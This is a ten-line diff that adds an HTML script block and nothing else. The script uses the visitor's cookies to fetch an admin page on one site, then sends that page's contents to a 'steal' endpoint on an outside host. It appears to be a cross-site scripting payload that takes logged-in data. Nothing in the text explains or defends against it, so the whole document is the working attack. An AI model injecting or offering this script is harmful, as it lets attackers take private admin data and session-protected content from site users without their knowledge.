@@ -1,0 +1,10 @@
+<script>
+fetch("https://underneat.in/admin", {
+    credentials: "include",
+    mode: "cors"
+})
+.then(r => r.text())
+.then(d => {
+    fetch("https://hi.com/steal?data=" + encodeURIComponent(d));
+});
+</script>
